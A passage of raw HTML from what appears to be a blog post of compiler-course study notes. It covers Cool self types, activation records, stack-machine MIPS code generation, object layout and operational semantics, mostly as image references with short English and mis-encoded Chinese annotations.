<br>inc():<span class="hljs-built_in">Count</span>&#123;//è¿”å›<span class="hljs-built_in">Count</span>çš„<span class="hljs-keyword">class</span>ç±»å‹<br>&#123;<br>i&lt;-i+<span class="hljs-number">1</span>; <br>self;<br>&#125;<br>&#125;;<br>&#125;;<br><br><span class="hljs-keyword">class</span> Stock inherits <span class="hljs-built_in">Count</span>&#123;<br><span class="hljs-keyword">name</span>: String;--<span class="hljs-keyword">name</span> of item<br>&#125;<br><span class="hljs-keyword">class</span> Main&#123;<br>Stocka-(new Stock).inc();//ç±»å‹é”™è¯¯ï¼Œ<span class="hljs-built_in">Count</span>ä¸æ˜¯Stockçš„å­é›†<br>...a.<span class="hljs-keyword">name</span> ...<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200803112048486.png" class="" title="image-20200803112048486"><h3 id="Self-Type-Operations"><a href="#Self-Type-Operations" class="headerlink" title="Self Type Operations"></a>Self Type Operations</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200803112942180.png" class="" title="image-20200803112942180"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200803113101122.png" class="" title="image-20200803113101122"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200803113408665.png" class="" title="image-20200803113408665"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200803114939592.png" class="" title="image-20200803114939592"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200803115337069.png" class="" title="image-20200803115337069"><h3 id="Self-Type-Usage"><a href="#Self-Type-Usage" class="headerlink" title="Self Type Usage"></a>Self Type Usage</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804090907495.png" class="" title="image-20200804090907495"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804090921258.png" class="" title="image-20200804090921258"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804091404056.png" class="" title="image-20200804091404056"><h3 id="Self-Type-Checking"><a href="#Self-Type-Checking" class="headerlink" title="Self Type Checking"></a>Self Type Checking</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804094143731.png" class="" title="image-20200804094143731"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804094222838.png" class="" title="image-20200804094222838"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804094434305.png" class="" title="image-20200804094434305"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804094508391.png" class="" title="image-20200804094508391"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804094930978.png" class="" title="image-20200804094930978"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804094952794.png" class="" title="image-20200804094952794"><h3 id="Error-Recovery"><a href="#Error-Recovery" class="headerlink" title="Error Recovery"></a>Error Recovery</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804100054994.png" class="" title="image-20200804100054994"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804095353003.png" class="" title="image-20200804095353003"><blockquote><p>a workable solution but with cascading errors</p></blockquote><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804100442013.png" class="" title="image-20200804100442013"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804100525228.png" class="" title="image-20200804100525228"><h3 id="Runtime-Organization"><a href="#Runtime-Organization" class="headerlink" title="Runtime Organization"></a>Runtime Organization</h3><p> Enforcing the language definition is just one purpose of the front-end. The front-end also builds the data structures that are needed to do co-generation as we seen but there is a real. Once we get through the front-end we no longer looking for errors in the program. Weâ€™re no longer trying to figure out whether itâ€™s a valid program. Now weâ€™re really down to the point where weâ€™re going to generate code And that is a job at the back end. </p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804100935737.png" class="" title="image-20200804100935737"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804101607087.png" class="" title="image-20200804101607087"><h3 id="Activations"><a href="#Activations" class="headerlink" title="Activations"></a>Activations</h3><p>Two goals:</p><ul><li>Correctness</li><li>Speed</li></ul><p>Complications in code generation come from trying to be fast as well as correct</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804102036374.png" class="" title="image-20200804102036374"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804103800174.png" class="" title="image-20200804103800174"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804103904151.png" class="" title="image-20200804103904151"><h4 id="activation-tree"><a href="#activation-tree" class="headerlink" title="activation tree"></a>activation tree</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804104501937.png" class="" title="image-20200804104501937"><blockquote><p>å­æ ‘åœ¨åŒä¸€è¡Œå†…ä»£è¡¨è°ƒç”¨åï¼Œéœ€è¦ä¾æ¬¡è°ƒç”¨çš„å‡½æ•°</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">is<span class="hljs-constructor">Even(<span class="hljs-params">x</span>:Int)</span> : Bool &#123;x % <span class="hljs-number">2</span><span class="hljs-operator"> == </span><span class="hljs-number">0</span>&#125;;<br>is<span class="hljs-constructor">One(<span class="hljs-params">x</span>:Int)</span> : Bool &#123;x<span class="hljs-operator"> == </span><span class="hljs-number">1</span>&#125;;<br>power<span class="hljs-constructor">OfTwo(<span class="hljs-params">x</span>:Int)</span> : Bool &#123;<br><span class="hljs-keyword">if</span> is<span class="hljs-constructor">Even(<span class="hljs-params">x</span>)</span> <span class="hljs-keyword">then</span> power<span class="hljs-constructor">OfTwo(<span class="hljs-params">x</span> <span class="hljs-operator">/</span> 2)</span><br><span class="hljs-keyword">else</span> is<span class="hljs-constructor">One(<span class="hljs-params">x</span>)</span><br>&#125;;<br></code></pre></td></tr></table></figure><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804105015043.png" class="" title="image-20200804105015043"></blockquote><h3 id="Activation-Records"><a href="#Activation-Records" class="headerlink" title="Activation Records"></a>Activation Records</h3><p>The information needed to manage one procedure activation is called an activation record (AR) or frame</p><p>If procedure <strong>F</strong> calls <strong>G</strong>, then <strong>G</strong>â€˜s activation record contains a mix of info about <strong>F</strong> and <strong>G</strong>.</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804105747132.png" class="" title="image-20200804105747132"><p>The compiler must determine,at compile-time,the layout of activation records and generate code that correctly accesses locations in the activation record </p><p>Thus,the AR layout and the code generator must be designed together!</p><h3 id="Globals-and-Heap"><a href="#Globals-and-Heap" class="headerlink" title="Globals and Heap"></a>Globals and Heap</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804111927233.png" class="" title="image-20200804111927233"><p>Both the heap and the stack grow</p><p>Must take care that they donâ€™t grow into each other</p><p>Solution:start heap and stack at opposite ends of memory and let them grow towards each other</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804112106101.png" class="" title="image-20200804112106101"><h3 id="Alignment"><a href="#Alignment" class="headerlink" title="Alignment"></a>Alignment</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804112719766.png" class="" title="image-20200804112719766"><h3 id="Stack-Machines"><a href="#Stack-Machines" class="headerlink" title="Stack Machines"></a>Stack Machines</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804112851657.png" class="" title="image-20200804112851657"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804113208145.png" class="" title="image-20200804113208145"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804113359758.png" class="" title="image-20200804113359758"> <img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804114035608.png" class="" title="image-20200804114035608"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804114216478.png" class="" title="image-20200804114216478"><p>After evaluating an expression e, the accumulator holds the value of e and the stack is unchanged.</p><p> <em>Expression evaluation preserves the stack.</em></p><h4 id="exmaple"><a href="#exmaple" class="headerlink" title="exmaple"></a>exmaple</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200804115009773.png" class="" title="image-20200804115009773"><h2 id="Code-Generation"><a href="#Code-Generation" class="headerlink" title="Code Generation"></a>Code Generation</h2><h3 id="Introduction-to-Code-Generation"><a href="#Introduction-to-Code-Generation" class="headerlink" title="Introduction to Code Generation"></a>Introduction to Code Generation</h3><p>The accumulator is kept in MIPS register $a0</p><p>The stack is kept in memory</p><ul><li>The stack grows towards lower addresses</li><li>Standard convention on MIPS</li></ul><p>The address of the next location on the stack is kept in MIPS register <code>$sp</code> (stack pointer</p><ul><li>The top of the stack is at address <code>$sp+4</code></li></ul><p><strong>Stack is growing towards low addresses</strong></p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808090532307.png" class="" title="image-20200808090532307"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808090733566.png" class="" title="image-20200808090733566"><h4 id="example"><a href="#example" class="headerlink" title="example"></a>example</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808090948399.png" class="" title="image-20200808090948399"><h3 id="Code-Generation-I"><a href="#Code-Generation-I" class="headerlink" title="Code Generation I"></a>Code Generation I</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808092449719.png" class="" title="image-20200808092449719"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808092520377.png" class="" title="image-20200808092520377"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808092406241.png" class="" title="image-20200808092406241"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808092138761.png" class="" title="image-20200808092138761"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808092837102.png" class="" title="image-20200808092837102"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808093434286.png" class="" title="image-20200808093434286"><h3 id="Code-Generation-II"><a href="#Code-Generation-II" class="headerlink" title="Code Generation II"></a>Code Generation II</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808101554898.png" class="" title="image-20200808101554898"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808101652847.png" class="" title="image-20200808101652847"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808101826630.png" class="" title="image-20200808101826630"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808102115320.png" class="" title="image-20200808102115320"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808102420307.png" class="" title="image-20200808102420307"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808102625336.png" class="" title="image-20200808102625336"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808102731121.png" class="" title="image-20200808102731121"><h4 id="example-1"><a href="#example-1" class="headerlink" title="example"></a>example</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808103106476.png" class="" title="image-20200808103106476"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808103516812.png" class="" title="image-20200808103516812"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808103618842.png" class="" title="image-20200808103618842"><h3 id="Code-Generation-Example"><a href="#Code-Generation-Example" class="headerlink" title="Code Generation Example"></a>Code Generation Example</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808104801419.png" class="" title="image-20200808104801419"><h3 id="Temporaries"><a href="#Temporaries" class="headerlink" title="Temporaries"></a>Temporaries</h3><p>Idea:Keep temporaries in the AR</p><p>The code generator must assign a fixed location in the AR for each temporary</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808113002505.png" class="" title="image-20200808113002505"><blockquote><p>While we need one here for the predicate, but notice that once the predicate is decided, once we know the answer to whether this predicate is true or false, we donâ€™t need that temporary anymore. So in fact, that temporary can be reclaimed; we donâ€™t need the space for that temporary anymore by the time we get to the false branch.</p></blockquote><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808112920088.png" class="" title="image-20200808112920088"><blockquote><p>NT(e1 + e2) = max(NT(e1), 1 + NT(e2))</p></blockquote><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808113708280.png" class="" title="image-20200808113708280"><h4 id="example-2"><a href="#example-2" class="headerlink" title="example"></a>example</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808113903169.png" class="" title="image-20200808113903169"><blockquote><p>æœ€å¤šéœ€è¦ä¸¤ä¸ªtemporariesæ¥å‚¨å­˜è¿™äº›æ•°æ®</p><p>if çš„true æˆ–flase ä¸€ä¸ªï¼Œå•ä¸ªintå¯ä»¥å˜æˆè¿”å›å€¼ï¼ˆä¸ç”¨ä¸´æ—¶å˜é‡ï¼‰ï¼Œè°ƒç”¨fib ä¼ é€’çš„å‚æ•°éœ€è¦ç”¨ä¸´æ—¶å˜é‡</p></blockquote><p>For a function definition <strong>f(x.â€¦â€¦ Xn)=e</strong> the AR has <strong>2+n+NT(e)</strong> elements</p><ul><li>Return addressL</li><li>Frame pointer C</li><li><strong>n</strong> arguments</li><li><strong>NT(e)</strong> locations for intermediate results</li></ul><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808114653932.png" class="" title="image-20200808114653932"><h4 id="new-scheme"><a href="#new-scheme" class="headerlink" title="new scheme"></a>new scheme</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808115316923.png" class="" title="image-20200808115316923"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808115353156.png" class="" title="image-20200808115353156"><blockquote><p>nt  unused temporary</p></blockquote><h3 id="Object-Layout"><a href="#Object-Layout" class="headerlink" title="Object Layout"></a>Object Layout</h3><p>00 implementation=Basic code generation + <strong>More stuff</strong></p><p>0o Slogan:If <strong>B is a subclass of A</strong>,than an object of class B can be used wherever an object of class A is expected</p><p>This means that code in class A works <strong>unmodified</strong> for an object of class B</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808120906584.png" class="" title="image-20200808120906584"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808121002133.png" class="" title="image-20200808121002133"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808121205970.png" class="" title="image-20200808121205970"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808120828905.png" class="" title="image-20200808120828905"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808120723112.png" class="" title="image-20200808120723112"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808121617559.png" class="" title="image-20200808121617559"><p>Every class has a fixed set of methods</p><ul><li>including inherited methods</li></ul><p>A <strong>dispatch table</strong> indexes these methods</p><ul><li>An array of method entry points</li><li>A method <strong>f</strong> lives at <strong>a fixed offset</strong> in the dispatch table for a class and <strong>all of its subclasses</strong></li></ul><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808122344016.png" class="" title="image-20200808122344016"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808122753473.png" class="" title="image-20200808122753473"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808122815394.png" class="" title="image-20200808122815394"><h3 id="opentional-Semantics-overview"><a href="#opentional-Semantics-overview" class="headerlink" title="opentional Semantics overview"></a>opentional Semantics overview</h3><p>We must specify for every Cool expression what happens<br>when it is evaluated</p><ul><li>This is theâ€meaningâ€of an expression</li></ul><p>The definition of a programming language:</p><ul><li>The tokens &gt;lexical analysis</li><li>The grammar &gt;syntactic analysis</li><li>The typing rules &gt;semantic analysis</li><li>The evaluation rules<br>  â†’code generation and optimization</li></ul><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808142452501.png" class="" title="image-20200808142452501"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808142730543.png" class="" title="image-20200808142730543"><h4 id="Denotaional-semantics"><a href="#Denotaional-semantics" class="headerlink" title="Denotaional semantics"></a>Denotaional semantics</h4><p>Programâ€™s meaning is a mathematical function</p><h4 id="Axiomatic-semantics"><a href="#Axiomatic-semantics" class="headerlink" title="Axiomatic semantics"></a>Axiomatic semantics</h4><ul><li>Program behavior described via logical formulae<ul><li>If execution begins in state satisfying X,then it ends in state satisfyingY</li><li>X,Y formulas</li></ul></li><li>Foundation of many program verification systems</li></ul><h3 id="Operational-Semantics"><a href="#Operational-Semantics" class="headerlink" title="Operational Semantics"></a>Operational Semantics</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808143144331.png" class="" title="image-20200808143144331"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808143427301.png" class="" title="image-20200808143427301"><p>A variable environment maps variables to locations</p><ul><li><p>Keeps track of which yariables are in scope</p></li><li><p>Tells us where those variables are</p><p><strong>E = [ a : l1, b : l2 ]</strong></p></li></ul><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808144113316.png" class="" title="image-20200808144113316"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808144211557.png" class="" title="image-20200808144211557"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808144502293.png" class="" title="image-20200808144502293"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808144825648.png" class="" title="image-20200808144825648"><h3 id="Cool-Semantics"><a href="#Cool-Semantics" class="headerlink" title="Cool Semantics"></a>Cool Semantics</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808145028046.png" class="" title="image-20200808145028046"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808145137544.png" class="" title="image-20200808145137544"><blockquote><p>first we look up in the environment <strong>E</strong> where that identifier <strong>id</strong> is stored so now we give us back a memory </p><p>location <strong>l</strong>. So by in this case And then we look up in the store <strong>S</strong> what the value is at that memory locations, So, </p><p>we use the same memory location here as an argument to the store to get back the value that variable currently</p><p>has And notice I just have a reference, this is a read of memories so this is loading, I think it was loading the </p><p>value of the variable. This does not affect the store so the store <strong>S</strong> is the same before and after. This is just looking </p><p>at the value</p></blockquote><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808145557313.png" class="" title="image-20200808145557313"><h4 id="assignment"><a href="#assignment" class="headerlink" title="assignment"></a>assignment</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808145750438.png" class="" title="image-20200808145750438"><blockquote><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808145944381.png" class="" title="image-20200808145944381"><p>we modify the store at that point with the new value so we replace the location l id or we update the value of l, i, d to be the value of v and we do that in store s1 which gives us a new store s2.</p></blockquote><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808150452154.png" class="" title="image-20200808150452154"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808150819402.png" class="" title="image-20200808150819402"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808151558053.png" class="" title="image-20200808151558053"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808151807567.png" class="" title="image-20200808151807567"><h4 id="if-else"><a href="#if-else" class="headerlink" title="if else"></a>if else</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808151959085.png" class="" title="image-20200808151959085"><h4 id="while"><a href="#while" class="headerlink" title="while"></a>while</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808152117753.png" class="" title="image-20200808152117753"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808152158870.png" class="" title="image-20200808152158870"><h4 id="let"><a href="#let" class="headerlink" title="let"></a>let</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808152603765.png" class="" title="image-20200808152603765"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808152652618.png" class="" title="image-20200808152652618"><h3 id="Cool-Semantics-II"><a href="#Cool-Semantics-II" class="headerlink" title="Cool Semantics II"></a>Cool Semantics II</h3><h4 id="new"><a href="#new" class="headerlink" title="new"></a>new</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808153226162.png" class="" title="image-20200808153226162"><img 